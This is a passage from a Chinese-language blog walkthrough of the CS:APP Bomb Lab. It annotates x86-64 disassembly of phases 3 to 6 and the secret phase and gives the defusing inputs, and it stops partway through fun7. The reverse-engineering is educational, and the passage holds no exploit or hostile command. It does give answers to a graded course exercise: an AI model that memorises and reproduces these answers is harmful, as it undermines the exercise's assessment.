47 01 00 00       	mov    $0x147,%eax #case 6 0x147 = 327</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax #else case</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax #处理第二个数 与case中存放的数进行比较</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt; #equal相等则跳转</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq   </span><br></pre></td></tr></table></figure>



<p><strong>思路：</strong></p>
<ul>
<li>考察的是switch语句的汇编表示，也调用了sscanf<ul>
<li><code>x/s 0x4025cf</code>结果是两个数，第一个放在0xc（%rsp）存入rcx 和 第二个数放在0x8（rsp）存入 rdx</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026161957698.png" alt="0x4025cf"></li>
</ul>
</li>
<li>对于0x8（rsp）只在下面出现过<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026162400954.png" alt="image-20231026162400954"></li>
<li>*解引用 也就是0x402470这个地址在存储的 值与8乘rax的值加在一起组成的地址 rax既是前一个输入的参数 </li>
<li><code>x/wx 0x402470</code>得到  指令x：查看内存指令、w：四字节 x：16进制显示，<strong>跳转到0x400f7c，也就是下一行，对应switch的第一个case</strong><ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026162723425.png" alt="image-20231026162723425"></li>
</ul>
</li>
</ul>
</li>
<li>对于0xc：<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026163415020.png" alt="image-20231026163415020"></li>
</ul>
</li>
<li>这七个case 处理不同的逻辑，即我们传入两个数，第一个数用来判断要去哪个case， 第二个数用来和这个case存放的书进行比较，如果相等则通过，不相等则bomb </li>
<li>答案不唯一 对应的case 输入对应的值就好 0 207<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026164924005.png" alt="phase_3"></li>
</ul>
</li>
</ul>
<h2 id="3-4-phase-4"><a href="#3-4-phase-4" class="headerlink" title="3.4 phase_4"></a>3.4 phase_4</h2><p><strong>phase_4 coding</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx #第二个数</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx #第一个数</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi # %d %d </span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax #eax存入0</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt; #sscanf</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax #</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;  #jump not equal 不相等则跳转 bomb</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp) #32位比较0xe = 14</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt; #jbe小于等于则跳转 0x40103a </span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx # 14</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi # 0 传入func函数</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi #第一个参数传入 edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt; # func 调用</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax #test 与运算</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt; #不相等 不等于0则bomb</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp) #0 比较 </span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>func4 coding</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax #edx = 14  eax = 0xe</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax #esi = 0   eax = 0xe - 0x0</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx # ecx = 0xe</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx #逻辑右移 0x1f = 31位 ecx = 0</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax # eax = 0xe</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax  #算数右移1位 符号位不变 1110(14)  -&gt;0111(7)</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx #rsi(0) + rax(7) = 0x7 </span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx #与传入的参数比较</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt; #小于或等于跳0x400ff2 </span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx #大于的情况 则减一</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax #eax = 0</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx # 比较ecx = 7 edi 传入的参数</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt; #&gt;= 跳401007</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi #否则（小于的情况） esi + 1</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt; #递归</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  40100b:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>思路</strong></p>
<ul>
<li>同上sscanf 输入标准化是“<code>%d %d</code>” 第一个数放在0x8(%rsp)，第二个数放在0xc(%rsp)</li>
<li>要求第一个数不大于14<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026194939554.png" alt="image-20231026194939554"></li>
</ul>
</li>
<li>要求第二个数等于0<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026195056021.png" alt="image-20231026195056021"></li>
</ul>
</li>
<li>使用 0x8，调用了func4 函数,func函数的第一个参数是我们输入的第一个数 0x8(%rsp)，第二个 第三个参数是常数，然后判断func的返回值 是否等于0，不能等0则bomb<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026171015752.png" alt="image-20231026171015752"></li>
</ul>
</li>
<li>然后就分析 func函数传入0和 14实现了什么 那么 ecx &#x3D; 7 只需要让rdi也等于7 即第一参数等于7即可<ul>
<li><code>sar    %eax</code> 等价于<code>SAR EAX 1</code></li>
</ul>
</li>
<li>输入 7 0<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026202629160.png" alt="phase_4"></li>
</ul>
</li>
</ul>
<h2 id="3-5-phase-5"><a href="#3-5-phase-5" class="headerlink" title="3.5 phase_5"></a>3.5 phase_5</h2><p><strong>phase_5 coding</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp #开辟空间 32字节</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx #rdi = rbx</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax #fs偏移0x28(40)存入%rax中 保护堆栈</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:	31 c0                	xor    %eax,%eax #异或</span><br><span class="line">  40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt; #调用函数</span><br><span class="line">  40107f:	83 f8 06             	cmp    $0x6,%eax #6 和eax比较 传入6个字符</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt; #相等则跳转4010d2</span><br><span class="line">  401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt; #否则bomb</span><br><span class="line">  401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt; </span><br><span class="line">  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx # 0扩展 ecx = *rax + *rbx = *rdi + *rax 第rax个字符</span><br><span class="line">  40108f:	88 0c 24             	mov    %cl,(%rsp) #栈顶rsp = cl（rax的低4位） </span><br><span class="line">  401092:	48 8b 14 24          	mov    (%rsp),%rdx  #rdx = rsp = cl （rax的低4位）</span><br><span class="line">  401096:	83 e2 0f             	and    $0xf,%edx #edx与运算 1111 即取cl的低四位 存入edx</span><br><span class="line">  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx #第一条字符串 0x4024b0[rdx]处的字符加载到edx上</span><br><span class="line">  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1) #dl-&gt;rax + rsp + 0x10处</span><br><span class="line">  4010a4:	48 83 c0 01          	add    $0x1,%rax #rax++</span><br><span class="line">  4010a8:	48 83 f8 06          	cmp    $0x6,%rax #循环6次</span><br><span class="line">  4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt; #不相等最跳转0x40108b循环</span><br><span class="line">  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi #第二条字符串 “flyers”</span><br><span class="line">  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi #0x10~0x15（rsp） 和flyers是否相等</span><br><span class="line">  4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt; #看字符串是否不相等 不相等则爆炸</span><br><span class="line">  4010c2:	85 c0                	test   %eax,%eax #与运算</span><br><span class="line">  4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt; #相等跳d9</span><br><span class="line">  4010c6:	e8 6f 03 00 00       	callq  40143a &lt;explode_bomb&gt; #否则报错</span><br><span class="line">  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax # 最初 eax = 0</span><br><span class="line">  4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt; #跳转40108b</span><br><span class="line">  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:	00 00 </span><br><span class="line">  4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:	e8 42 fa ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:	48 83 c4 20          	add    $0x20,%rsp</span><br><span class="line">  4010f2:	5b                   	pop    %rbx</span><br><span class="line">  4010f3:	c3                   	retq   </span><br></pre></td></tr></table></figure>



<p><strong>思路：</strong></p>
<ul>
<li><code>gdb x/s 0x4024b0</code>得到如下字符串<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026204707552.png" alt="image-20231026204707552"></li>
</ul>
</li>
<li><code>gdb x/s 0x40245e</code> 得到如下字符串：<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026205058798.png" alt="image-20231026205058798"></li>
</ul>
</li>
<li><code>cmp    $0x6,%eax</code> 和 <code>je     4010d2 &lt;phase_5+0x70&gt;</code> 规定了要传入6个字符 否则会爆炸</li>
<li>即我们<strong>输入的6个字符 低四位rdx 在0x4024b0[rdx]</strong> 得到一个字符串<strong>要与 flyers相等</strong>就行</li>
<li>所以在字符串1中找出rdx即可 分别是9（1001）、15（1111）、14（1110）、5（0101）、6（0110）、7（0111）</li>
<li>查找ascii码数的低四位即可是上述即可 9?NUVW<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026214015659.png" alt="image-20231026214015659"></li>
</ul>
</li>
</ul>
<h2 id="3-6-phase-6"><a href="#3-6-phase-6" class="headerlink" title="3.6 phase_6"></a>3.6 phase_6</h2><p><strong>phase_6 coding</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:	41 56                	push   %r14</span><br><span class="line">  4010f6:	41 55                	push   %r13</span><br><span class="line">  4010f8:	41 54                	push   %r12</span><br><span class="line">  4010fa:	55                   	push   %rbp</span><br><span class="line">  4010fb:	53                   	push   %rbx</span><br><span class="line">  4010fc:	48 83 ec 50          	sub    $0x50,%rsp #开辟0x50 空间</span><br><span class="line">  401100:	49 89 e5             	mov    %rsp,%r13 # r13 = rsp </span><br><span class="line">  401103:	48 89 e6             	mov    %rsp,%rsi #rsi = rsp  </span><br><span class="line">  401106:	e8 51 03 00 00       	callq  40145c &lt;read_six_numbers&gt; #调用函数</span><br><span class="line">  40110b:	49 89 e6             	mov    %rsp,%r14 #r14 = rsp</span><br><span class="line">  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d #r12d = 0x0</span><br><span class="line">  --------------------------------------------------------------------#大循环1 r12d是下标</span><br><span class="line">  401114:	4c 89 ed             	mov    %r13,%rbp #rbp = r13 =rsp</span><br><span class="line">  401117:	41 8b 45 00          	mov    0x0(%r13),%eax #</span><br><span class="line">  40111b:	83 e8 01             	sub    $0x1,%eax #eax--</span><br><span class="line">  40111e:	83 f8 05             	cmp    $0x5,%eax </span><br><span class="line">  401121:	76 05                	jbe    401128 &lt;phase_6+0x34&gt; #&lt;=5 则跳401128说明输入在[1,6]之间 !!!!--------判断这个数是否处于[1,6]之间</span><br><span class="line">  401123:	e8 12 03 00 00       	callq  40143a &lt;explode_bomb&gt; #&gt;5 bomb</span><br><span class="line">  401128:	41 83 c4 01          	add    $0x1,%r12d # r12d++ r12d = 1 当前值的索引值加1</span><br><span class="line">  40112c:	41 83 fc 06          	cmp    $0x6,%r12d # #循环6次</span><br><span class="line">  401130:	74 21                	je     401153 &lt;phase_6+0x5f&gt; #相等则跳转401153</span><br><span class="line">  401132:	44 89 e3             	mov    %r12d,%ebx #ebx = r12d 索引下一个数</span><br><span class="line">  ------------------------#嵌套循环 ！！！判断这个数是否与数组中其余数相等</span><br><span class="line">  401135:	48 63 c3             	movslq %ebx,%rax #sign 符号拓展 索引放入rax </span><br><span class="line">  401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax #eax = 4*rax + rsp 算出上面查过数的地址，通过地址找到这个数，放入eax rsp[4*ebx]</span><br><span class="line">  40113b:	39 45 00             	cmp    %eax,0x0(%rbp) #把eax找的数与rbp的比较 即六个数字不能相等</span><br><span class="line">  40113e:	75 05                	jne    401145 &lt;phase_6+0x51&gt; #不相等则跳转401145</span><br><span class="line">  401140:	e8 f5 02 00 00       	callq  40143a &lt;explode_bomb&gt; #相等则bomb</span><br><span class="line">  401145:	83 c3 01             	add    $0x1,%ebx #ebx++</span><br><span class="line">  401148:	83 fb 05             	cmp    $0x5,%ebx #</span><br><span class="line">  40114b:	7e e8                	jle    401135 &lt;phase_6+0x41&gt; #小于跳401135 循环</span><br><span class="line">  ---------------------- #嵌套循环结束</span><br><span class="line">  40114d:	49 83 c5 04          	add    $0x4,%r13 #r13继续指向下一个数</span><br><span class="line">  401151:	eb c1                	jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">  -------------------------------------------------------------#大循环结束</span><br><span class="line">  401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi</span><br><span class="line">  401158:	4c 89 f0             	mov    %r14,%rax #r14 = rsp = 输入的6个数</span><br><span class="line">  40115b:	b9 07 00 00 00       	mov    $0x7,%ecx #exc = 7</span><br><span class="line">  401160:	89 ca                	mov    %ecx,%edx #edx=ecx = 7</span><br><span class="line">  401162:	2b 10                	sub    (%rax),%edx #rax 指向输入的数然后用7减 edx -= rax</span><br><span class="line">  401164:	89 10                	mov    %edx,(%rax) #将结果放入rax</span><br><span class="line">  401166:	48 83 c0 04          	add    $0x4,%rax #下一个数</span><br><span class="line">  40116a:	48 39 f0             	cmp    %rsi,%rax #比较rsi与rax</span><br><span class="line">  40116d:	75 f1                	jne    401160 &lt;phase_6+0x6c&gt; #不相等则跳转 441160循环直到把所有参数都改变了 </span><br><span class="line">  40116f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401174:	eb 21                	jmp    401197 &lt;phase_6+0xa3&gt; #全都不相等跳401197</span><br><span class="line">  --------------------------# edx中的7-int的元素放入 链表中</span><br><span class="line">  401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx #rdx = *rdx + 8 字节对齐 p = p-&gt;next</span><br><span class="line">  40117a:	83 c0 01             	add    $0x1,%eax #eax++</span><br><span class="line">  40117d:	39 c8                	cmp    %ecx,%eax #</span><br><span class="line">  40117f:	75 f5                	jne    401176 &lt;phase_6+0x82&gt; #不等跳401176</span><br><span class="line">  401181:	eb 05                	jmp    401188 &lt;phase_6+0x94&gt; #否则跳401188</span><br><span class="line">  401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx #链表头指针</span><br><span class="line">  401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2) #rdx -》 rsp[2*rsi+0x20]</span><br><span class="line">  40118d:	48 83 c6 04          	add    $0x4,%rsi #指向下一个</span><br><span class="line">  401191:	48 83 fe 18          	cmp    $0x18,%rsi</span><br><span class="line">  401195:	74 14                	je     4011ab &lt;phase_6+0xb7&gt; #相等跳4011ab</span><br><span class="line">  ----------------------------------------------------------------</span><br><span class="line">  401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx #ecx = rsp[rsi]</span><br><span class="line">  40119a:	83 f9 01             	cmp    $0x1,%ecx #和1 比较</span><br><span class="line">  40119d:	7e e4                	jle    401183 &lt;phase_6+0x8f&gt; #&lt;=1 跳转401183</span><br><span class="line">  40119f:	b8 01 00 00 00       	mov    $0x1,%eax # eax = 1</span><br><span class="line">  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx #edx = 0x6032d0 gdb一下 node变量</span><br><span class="line">  4011a9:	eb cb                	jmp    401176 &lt;phase_6+0x82&gt; #然会跳转401176 上面那段</span><br><span class="line">  -------------------------------------------------------------------------</span><br><span class="line">  4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx #rbx最初节点</span><br><span class="line">  4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax # 下一个节点</span><br><span class="line">  4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi</span><br><span class="line">  4011ba:	48 89 d9             	mov    %rbx,%rcx</span><br><span class="line">  -------------------------------------------------------------</span><br><span class="line">  4011bd:	48 8b 10             	mov    (%rax),%rdx #rax指向位置拿出node变量的地址</span><br><span class="line">  4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx) #node-&gt;next</span><br><span class="line">  4011c4:	48 83 c0 08          	add    $0x8,%rax</span><br><span class="line">  4011c8:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">  4011cb:	74 05                	je     4011d2 &lt;phase_6+0xde&gt; #相等跳 4011d2</span><br><span class="line">  4011cd:	48 89 d1             	mov    %rdx,%rcx</span><br><span class="line">  4011d0:	eb eb                	jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">  4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx) #指向最后一个节点</span><br><span class="line">  4011d9:	00 </span><br><span class="line">  ---------------------------------------------------------------------</span><br><span class="line">  4011da:	bd 05 00 00 00       	mov    $0x5,%ebp #循环变量 索引</span><br><span class="line">  4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax #rbx指向第一个索引对应的节点 node.next放入 rax</span><br><span class="line">  4011e3:	8b 00                	mov    (%rax),%eax #rax解引用指向节点的val值 放入eax</span><br><span class="line">  4011e5:	39 03                	cmp    %eax,(%rbx) #比较eax和 rbx（上一个元素）</span><br><span class="line">  4011e7:	7d 05                	jge    4011ee &lt;phase_6+0xfa&gt; #rbx大于eax后者 则跳转4011ee 通过</span><br><span class="line">  4011e9:	e8 4c 02 00 00       	callq  40143a &lt;explode_bomb&gt; #否则就bomb</span><br><span class="line">  4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx</span><br><span class="line">  4011f2:	83 ed 01             	sub    $0x1,%ebp #ebp--</span><br><span class="line">  4011f5:	75 e8                	jne    4011df &lt;phase_6+0xeb&gt; #不循环</span><br><span class="line">  4011f7:	48 83 c4 50          	add    $0x50,%rsp #恢复栈顶</span><br><span class="line">  4011fb:	5b                   	pop    %rbx</span><br><span class="line">  4011fc:	5d                   	pop    %rbp</span><br><span class="line">  4011fd:	41 5c                	pop    %r12</span><br><span class="line">  4011ff:	41 5d                	pop    %r13</span><br><span class="line">  401201:	41 5e                	pop    %r14</span><br><span class="line">  401203:	c3                   	retq   </span><br></pre></td></tr></table></figure>



<p><strong>思路</strong></p>
<ul>
<li>实际上是链表的应用</li>
<li></li>
<li>将第一个大循环转换成c语言代码可以得</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> sixNum[<span class="number">6</span>] = &#123;输入的<span class="number">6</span>个数&#125; </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (sixNum[i] &gt; <span class="number">6</span>) <span class="built_in">explode_bomb</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; <span class="number">6</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sixNum[i] == sixNum[j]) explode_bomb;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>x/wx 0x6032d0</code></p>
<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231028113244985.png" alt="image-20231028113244985"></li>
<li>node 变量 链表！！！</li>
</ul>
</li>
<li><p><code>x/24wx 0x6032d0</code> 24字节</p>
<ul>
<li><p><img src="/2023/10/25/CSAPP-3-bomblab/image-20231028114724993.png" alt="image-20231028114724993"></p>
</li>
<li><table>
<thead>
<tr>
<th align="center">索引</th>
<th align="center">值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">332[0x14c]</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">168[0xa8]</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">924[0x39c]</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">691[0x2b3]</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">477[0x1dd]</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">443[0x1bb]</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p>单向链表：</p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单链表</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;<span class="comment">//节点上存储的元素</span></span><br><span class="line">    ListNode *next;<span class="comment">//指向下一个节点的指针</span></span><br><span class="line">    <span class="built_in">ListNode</span> (<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">NULL</span>)&#123;&#125;<span class="comment">//节点的构造函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>那么前面的嵌套循环作用：根据输入的索引，找到对应的node值，并且把这个值放入到一个数组中</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Node* addresses[<span class="number">6</span>] = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="type">int</span> index = sixNum[i];</span><br><span class="line">    addresses[i] = &amp;node1;</span><br><span class="line">    <span class="keyword">while</span> (addresses[i]-&gt;index != index)&#123;</span><br><span class="line">        addresses[i] = addresses[i]-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>所以题目要我们输入的是<strong>链表的索引顺序</strong>，这个顺序是降序排列的，并且每个值都要用 7- 。所以降序排列顺序为<code>3 4 5 6 1 2</code>答案为 <code>4 3 2 1 6 5</code><ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231028152223411.png" alt="image-20231028152223411"></li>
</ul>
</li>
</ul>
<h2 id="3-7-secret-phase"><a href="#3-7-secret-phase" class="headerlink" title="3.7 secret_phase"></a>3.7 secret_phase</h2><p><strong>secret_phase coding:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:	53                   	push   %rbx</span><br><span class="line">  401243:	e8 56 02 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:	ba 0a 00 00 00       	mov    $0xa,%edx</span><br><span class="line">  40124d:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401252:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  401255:	e8 76 f9 ff ff       	callq  400bd0 &lt;strtol@plt&gt; #strtol 将字符串转换成long</span><br><span class="line">  40125a:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax</span><br><span class="line">  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax #</span><br><span class="line">  401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt; #小于跳0x40126c</span><br><span class="line">  401267:	e8 ce 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:	89 de                	mov    %ebx,%esi</span><br><span class="line">  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi # %edi存放地址</span><br><span class="line">  401273:	e8 8c ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:	83 f8 02             	cmp    $0x2,%eax #2== eax</span><br><span class="line">  40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt; #2等于2 跳结束</span><br><span class="line">  40127d:	e8 b8 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:	bf 38 24 40 00       	mov    $0x402438,%edi</span><br><span class="line">  401287:	e8 84 f8 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:	e8 33 03 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:	5b                   	pop    %rbx</span><br><span class="line">  401292:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>func_7</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">  401204:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401208:	48 85 ff             	test   %rdi,%rdi #test 如果两个数位与 则会将0标志位置1</span><br><span class="line">  40120b:	74 2b                	je     401238 &lt;fun7+0x34&gt; #判断是否是null 是返回1</span><br><span class="line">  40120d:	8b 17                	mov    (%rdi),%edx #node-&gt;val</span><br><span class="line">  40120f:	39 f2                	cmp    %esi,%edx #与传入的值进行比较</span><br><span class="line">  401211:	7e 0d                	jle    401220 &lt;fun7+0x1c&gt; #小于等于则 401220</span><br><span class="line">  401213:	48 8b 7f 08          	mov    0x8(%rdi),%rdi #左子树 递归 8位</span><br><span class="line">  401217:	e8 e8 ff ff ff       	callq  401204 &lt;fun7&gt; #递归</span><br><span class="line">  40121c:	01 c0                	add    %eax,%eax #eax += eax 翻倍 调用左子树</span><br><span class="line">  40121e:	eb 1d                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:	b8 00 00 00 00       	mov    $0x0,%eax #eax = 0 归零</span><br><span class="line">  401225:	39 f2                	cmp    %esi,%edx # 所以这一段需要额外判断等</span><br><span class="line">  401227:	74 14                	je     40123d &lt;fun7+0x39&gt; #等于 返回</span><br><span class="line">  401229:	48 8b 7f 10          	mov    0x10(%rdi),%rdi #否则取其右子树 0x10 = 16 位</span><br><span class="line">  40122d:	e8 d2 